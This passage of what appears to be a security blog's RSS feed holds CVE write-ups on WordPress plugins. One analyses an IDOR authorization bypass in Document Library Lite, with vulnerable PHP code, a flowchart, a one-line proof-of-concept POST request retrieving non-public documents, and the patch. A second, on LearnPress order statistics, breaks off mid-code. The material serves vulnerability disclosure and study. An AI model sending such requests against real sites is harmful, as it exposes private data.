$args[ $option ] === &amp;#34;true&amp;#34; : $args[ $option ];&#xA;    }&#xA;&#xA;    // The post status can only have these values&#xA;    $valid_post_statuses = [ &amp;#39;publish&amp;#39;, &amp;#39;pending&amp;#39;, &amp;#39;draft&amp;#39;, &amp;#39;future&amp;#39;, &amp;#39;any&amp;#39; ];&#xA;    $args[ &amp;#39;status&amp;#39; ] = in_array( $args[&amp;#39;status&amp;#39;], $valid_post_statuses ) ? $args[ &amp;#39;status&amp;#39; ] : &amp;#39;publish&amp;#39;;&#xA;    &#xA;    return $args;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This function only validates allowed values and does not perform any permission checks.&lt;/p&gt;&#xA;&lt;p&gt;Because &lt;code&gt;status&lt;/code&gt; allows &lt;code&gt;pending&lt;/code&gt;, &lt;code&gt;draft&lt;/code&gt;, &lt;code&gt;future&lt;/code&gt;, and &lt;code&gt;any&lt;/code&gt;, a user can supply these values to view non-public documents → &lt;strong&gt;authorization bypass&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$response = $table-&amp;gt;get_table( &amp;#39;array&amp;#39; );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;get_table()&lt;/code&gt; is then called:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function get_table( $output_type = &amp;#39;html&amp;#39; ) {&#xA;    $columns = $this-&amp;gt;get_columns();&#xA;&#xA;    // Parse DataTables parameters from the AJAX request&#xA;    $draw   = isset( $_POST[&amp;#39;draw&amp;#39;] ) ? intval( $_POST[&amp;#39;draw&amp;#39;] ) : 1;&#xA;    $this-&amp;gt;args[&amp;#39;offset&amp;#39;]  = isset( $_POST[&amp;#39;start&amp;#39;] ) ? intval( $_POST[&amp;#39;start&amp;#39;] ) : 0;&#xA;    $this-&amp;gt;args[&amp;#39;rows_per_page&amp;#39;] = isset( $_POST[&amp;#39;length&amp;#39;] ) &amp;amp;&amp;amp; intval( $_POST[&amp;#39;length&amp;#39;] ) !== -1 ? intval( $_POST[&amp;#39;length&amp;#39;] ) : $this-&amp;gt;args[&amp;#39;rows_per_page&amp;#39;];&#xA;    $this-&amp;gt;args[&amp;#39;sort_by&amp;#39;] = isset( $_POST[&amp;#39;order&amp;#39;] ) ? $columns[$_POST[&amp;#39;order&amp;#39;][0][&amp;#39;column&amp;#39;]] : $this-&amp;gt;get_orderby();&#xA;    $this-&amp;gt;args[&amp;#39;sort_order&amp;#39;] = isset( $_POST[&amp;#39;order&amp;#39;] ) ? $_POST[&amp;#39;order&amp;#39;][0][&amp;#39;dir&amp;#39;] : $this-&amp;gt;args[&amp;#39;sort_order&amp;#39;];&#xA;    $this-&amp;gt;args[&amp;#39;search_value&amp;#39;] = isset( $_POST[&amp;#39;search&amp;#39;] ) ? $_POST[&amp;#39;search&amp;#39;][&amp;#39;value&amp;#39;] : &amp;#39;&amp;#39;;&#xA;    $this-&amp;gt;args[&amp;#39;rows_per_page&amp;#39;] = filter_var( $this-&amp;gt;args[&amp;#39;rows_per_page&amp;#39;], FILTER_VALIDATE_INT );&#xA;&#xA;    if ( $this-&amp;gt;args[&amp;#39;rows_per_page&amp;#39;] &amp;lt; 1 || ! $this-&amp;gt;args[&amp;#39;rows_per_page&amp;#39;] ) {&#xA;        $this-&amp;gt;args[&amp;#39;rows_per_page&amp;#39;] = false;&#xA;    }&#xA;    if( isset( $_POST[&amp;#39;category&amp;#39;] ) ) {&#xA;        $this-&amp;gt;args[&amp;#39;doc_category&amp;#39;] = $_POST[&amp;#39;category&amp;#39;];&#xA;    }&#xA;&#xA;    if ( ! in_array( $this-&amp;gt;args[&amp;#39;sort_by&amp;#39;], Options::get_allowed_columns(), true ) ) {&#xA;        $this-&amp;gt;args[&amp;#39;sort_by&amp;#39;] = Options::get_default_settings()[&amp;#39;sort_by&amp;#39;];&#xA;    }&#xA;&#xA;    if ( ! in_array( $this-&amp;gt;args[&amp;#39;sort_order&amp;#39;], [ &amp;#39;asc&amp;#39;, &amp;#39;desc&amp;#39; ], true ) ) {&#xA;        $this-&amp;gt;args[&amp;#39;sort_order&amp;#39;] = Options::get_default_settings()[&amp;#39;sort_order&amp;#39;];&#xA;    }&#xA;&#xA;    // Set default sort direction&#xA;    if ( ! $this-&amp;gt;args[&amp;#39;sort_order&amp;#39;] ) {&#xA;        if ( $this-&amp;gt;args[&amp;#39;sort_by&amp;#39;] === &amp;#39;date&amp;#39; ) {&#xA;            $this-&amp;gt;args[&amp;#39;sort_order&amp;#39;] = &amp;#39;desc&amp;#39;;&#xA;        } else {&#xA;            $this-&amp;gt;args[&amp;#39;sort_order&amp;#39;] = &amp;#39;asc&amp;#39;;&#xA;        }&#xA;    }&#xA;&#xA;    $this-&amp;gt;args[&amp;#39;content_length&amp;#39;]  = filter_var( $this-&amp;gt;args[&amp;#39;content_length&amp;#39;], FILTER_VALIDATE_INT );&#xA;    $this-&amp;gt;args[&amp;#39;scroll_offset&amp;#39;]   = filter_var( $this-&amp;gt;args[&amp;#39;scroll_offset&amp;#39;], FILTER_VALIDATE_INT );&#xA;&#xA;    if ( empty( $this-&amp;gt;args[&amp;#39;date_format&amp;#39;] ) ) {&#xA;        $this-&amp;gt;args[&amp;#39;date_format&amp;#39;] = Options::get_default_settings()[&amp;#39;date_format&amp;#39;];&#xA;    }&#xA;&#xA;    $output       = &amp;#39;&amp;#39;;&#xA;    $table_body   = &amp;#39;&amp;#39;;&#xA;    $body_row_fmt = &amp;#39;&amp;#39;;&#xA;&#xA;    // After an AJAX request, the paramaters should be set again&#xA;    $this-&amp;gt;set_post_args();&#xA;    // Get all published posts in the current language&#xA;    $all_posts = $this-&amp;gt;run_table_query( $this-&amp;gt;build_table_query( $this-&amp;gt;post_args ) );&#xA;&#xA;    // Bail early if no posts found&#xA;    if ( ! $all_posts || ! is_array( $all_posts ) ) {&#xA;        return $output;&#xA;    }&#xA;    &#xA;    // Add placeholder to table body format string so that content for this column is included in table output&#xA;    $cell_fmt     = &amp;#39;&amp;lt;td&amp;gt;{%s}&amp;lt;/td&amp;gt;&amp;#39;;&#xA;    $array_output = [];&#xA;    foreach ( $columns as $column ) {&#xA;        $body_row_fmt .= sprintf( $cell_fmt, $column );&#xA;    }&#xA;    if ( $output_type === &amp;#39;html&amp;#39; ) {&#xA;        // Build table body&#xA;        $body_row_fmt = &amp;#39;&amp;lt;tr&amp;gt;&amp;#39; . $body_row_fmt . &amp;#39;&amp;lt;/tr&amp;gt;&amp;#39;;&#xA;&#xA;        // Loop through posts and add a row for each&#xA;        foreach ( (array) $all_posts as $_post ) {&#xA;            setup_postdata( $_post );&#xA;&#xA;            $post_data_trans = apply_filters(&#xA;                &amp;#39;document_library_table_row_data_format&amp;#39;,&#xA;                $this-&amp;gt;get_row_content( $_post )&#xA;            );&#xA;&#xA;            $table_body .= strtr( $body_row_fmt, $post_data_trans );&#xA;        } // foreach post&#xA;&#xA;        wp_reset_postdata();&#xA;        return $table_body;&#xA;    } else {&#xA;        // Loop through posts and add a row for each&#xA;        foreach ( (array) $all_posts as $_post ) {&#xA;            setup_postdata( $_post );&#xA;            $array_output[] = $this-&amp;gt;get_row_content( $_post );&#xA;        }&#xA;    }&#xA;&#xA;    // Increment the table count&#xA;    &amp;#43;&amp;#43;self::$table_count;&#xA;    if ( $output_type === &amp;#39;html&amp;#39; ) {&#xA;        return apply_filters( &amp;#39;document_library_table_html_output&amp;#39;, $output, $this-&amp;gt;args );&#xA;    } else {&#xA;        $total_posts = $this-&amp;gt;get_total_posts();&#xA;&#xA;        // Prepare the response&#xA;        $response = [&#xA;            &amp;#39;draw&amp;#39;            =&amp;gt; $draw,&#xA;            &amp;#39;recordsTotal&amp;#39;    =&amp;gt; $total_posts,&#xA;            &amp;#39;recordsFiltered&amp;#39; =&amp;gt; $total_posts, // You can filter further if you add search functionality&#xA;            &amp;#39;data&amp;#39;            =&amp;gt; $array_output,&#xA;        ];&#xA;&#xA;        wp_send_json( $response );&#xA;&#xA;        // return &amp;#34;&amp;#34;;&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;get_table()&lt;/code&gt; reads multiple parameters directly from &lt;code&gt;$_POST&lt;/code&gt;, assigns them to &lt;code&gt;$this-&amp;gt;args&lt;/code&gt;, and uses them to build and execute document queries &lt;strong&gt;without checking user permissions&lt;/strong&gt;. Since the initial &lt;code&gt;$args&lt;/code&gt; (including &lt;code&gt;status&lt;/code&gt;) are client-controlled, users can query and retrieve documents with &lt;code&gt;pending&lt;/code&gt; or &lt;code&gt;draft&lt;/code&gt; status. The results are returned directly via JSON, leading to &lt;strong&gt;authorization bypass / IDOR&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Finally, &lt;code&gt;wp_send_json($response)&lt;/code&gt; &lt;strong&gt;returns the entire document data to the client&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;wp_send_json($response);   &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The patch fully mitigates the vulnerability by:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Forcing unauthenticated users to only view &lt;code&gt;publish&lt;/code&gt; documents&lt;/li&gt;&#xA;&lt;li&gt;Returning an &lt;code&gt;error&lt;/code&gt; if &lt;code&gt;status&lt;/code&gt; is not &lt;code&gt;publish&lt;/code&gt; and the user lacks the &lt;code&gt;edit_posts&lt;/code&gt; capability&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-20-cve-2025-67985/patch.png&#34; title=&#34;Patch&#34; data-thumbnail=&#34;/posts/2025-12-20-cve-2025-67985/patch.png&#34; data-sub-html=&#34;&lt;h2&gt;Patch&lt;/h2&gt;&lt;p&gt;Patch&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-20-cve-2025-67985/patch.png&#39; alt=&#34;Patch&#34; height=&#34;612&#34; width=&#34;1519&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Patch&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;&#xA;A[&amp;#34;Unauthenticated user&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Send POST request to /wp-admin/admin-ajax.php?action=dll_load_posts with args[status]=pending|draft|future|any&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;wp_ajax_nopriv_dll_load_posts hook triggered&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;Ajax_Handler::load_posts()&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;Read user-controlled $_POST[&amp;#39;args&amp;#39;]&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;Options::handle_shortcode_attribute_aliases()&amp;#34;]&#xA;F --&amp;gt; G[&amp;#34;Merge with default options via shortcode_atts()&amp;#34;]&#xA;G --&amp;gt; H[&amp;#34;Initialize simple_Document_Library($args)&amp;#34;]&#xA;H --&amp;gt; I[&amp;#34;validate_options(): only validate value, no permission check&amp;#34;]&#xA;I --&amp;gt; J[&amp;#34;status accepted: publish/pending/draft/future/any&amp;#34;]&#xA;J --&amp;gt; K[&amp;#34;Build query using user-controlled status&amp;#34;]&#xA;K --&amp;gt; L[&amp;#34;Query documents including non-public ones&amp;#34;]&#xA;L --&amp;gt; M[&amp;#34;get_table(&amp;#39;array&amp;#39;)&amp;#34;]&#xA;M --&amp;gt; N[&amp;#34;wp_send_json(response)&amp;#34;]&#xA;N --&amp;gt; O[&amp;#34;Non-public documents returned to user&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Send request:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;&#xA;action=dll_load_posts&amp;amp;args[status]=any&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-20-cve-2025-67985/result.png&#34; title=&#34;Result&#34; data-thumbnail=&#34;/posts/2025-12-20-cve-2025-67985/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Result&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-20-cve-2025-67985/result.png&#39; alt=&#34;Result&#34; height=&#34;856&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Result&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The vulnerability occurs because a public AJAX endpoint trusts the client-controlled &lt;code&gt;status&lt;/code&gt; parameter and directly uses it to query documents without performing permission checks. This allows unauthenticated users to access non-public documents, resulting in an authorization bypass / IDOR.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Validation does not replace authorization&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_nopriv_*&lt;/code&gt; is a public attack surface&lt;/li&gt;&#xA;&lt;li&gt;Query-affecting parameters must be bound to user permissions&lt;/li&gt;&#xA;&lt;li&gt;Returning JSON without permission checks can cause data leakage&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/idor.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;IDOR&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/document-library-lite/vulnerability/wordpress-document-library-lite-plugin-1-1-7-insecure-direct-object-references-idor-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Document Library Lite Plugin &amp;lt;= 1.1.7 is vulnerable to Insecure Direct Object References (IDOR)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-13956 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-12-16-cve-2025-13956/</link>
      <pubDate>Tue, 16 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-12-16-cve-2025-13956/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-16-cve-2025-13956/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;LearnPress – WordPress LMS Plugin&lt;/strong&gt; for &lt;strong&gt;WordPress&lt;/strong&gt; is affected by an &lt;strong&gt;unauthorized data access vulnerability&lt;/strong&gt; due to a &lt;strong&gt;lack of capability checks&lt;/strong&gt; in the &lt;strong&gt;statistics function&lt;/strong&gt; in &lt;strong&gt;all versions up to and including 4.3.1&lt;/strong&gt;. This allows &lt;strong&gt;unauthenticated attackers&lt;/strong&gt; to view the plugin&amp;rsquo;s &lt;strong&gt;order statistics&lt;/strong&gt;, including &lt;strong&gt;total revenue&lt;/strong&gt; and &lt;strong&gt;order status counts&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-13956&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-13956&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Broken Access Control&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 4.3.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 4.3.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.3)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/learnpress/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress LearnPress Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;LearnPress&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;4.3.1&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt; * &lt;code&gt;4.3.2&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin registered an action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action(&#xA;  &amp;#39;init&amp;#39;,&#xA;  function () 